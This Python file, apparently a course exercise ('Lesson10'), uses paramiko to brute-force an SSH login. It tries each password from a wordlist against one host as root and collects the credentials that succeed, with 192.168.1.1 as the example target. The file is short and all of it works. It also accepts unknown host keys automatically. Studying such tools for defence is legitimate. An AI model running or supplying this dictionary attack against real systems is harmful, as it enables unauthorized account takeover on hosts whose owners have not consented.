from __future__ import annotations

import socket
from typing import Dict

from paramiko import (AuthenticationException, BadHostKeyException, SSHClient,
                      SSHException)
from paramiko.client import AutoAddPolicy


def check_ssh(
    host: str,
    user: str,
    pwd: str,
    timeout: float = 3
) -> Dict[str, bool | str]:
    """ Doc: Function to check ssh host connection """
    client = SSHClient()
    client.set_missing_host_key_policy(policy=AutoAddPolicy)
    result = {"result": False, "msg": ""}
    try:
        client.connect(
            hostname=host,
            timeout=timeout,
            username=user,
            password=pwd
        )
        result["result"] = True
        result["msg"] = "The connection was successful."
        return result
    except BadHostKeyException as error:
        result["result"] = False
        result["msg"] = f"The connection was unsuccessful. Error msg: {error}"
    except AuthenticationException as error:
        result["result"] = False
        result["msg"] = f"Raise 'AuthenticationException'. Error msg: {error}"
    except SSHException as error:
        result["result"] = False
        result["msg"] = f"Raise 'SSHException'. Error msg: {error}"
    except socket.error as error:
        result["result"] = False
        result["msg"] = f"Raise 'socket.error'. Error msg: {error}"
    finally:
        client.close()
    return result


def brute_host(
    host: str,
    login: str,
    pwd_file: str
) -> list[tuple[str, str, str]]:
    """Brute host ssh password using dictionary"""
    finded_credential: list[tuple[str, str, str]] = []
    with open(pwd_file, 'r', encoding='utf-8') as file:
        for pwd in file:
            pwd = pwd.strip()
            if check_ssh(host=host, user=login, pwd=pwd)['result']:
                finded_credential.append((host, login, pwd))
    return finded_credential


if __name__ == '__main__':

    MY_HOST = '192.168.1.1'
    MY_USER = 'root'
    MY_PASSWORD = 'my_password'
    # is_ssh_connected = check_ssh(host=MY_HOST, user=MY_USER, pwd=MY_PASSWORD)
    # print(is_ssh_connected)
    rr = brute_host(
        host=MY_HOST,
        login=MY_USER,
        pwd_file='./Lesson10/dict.txt'
    )
    print(rr)
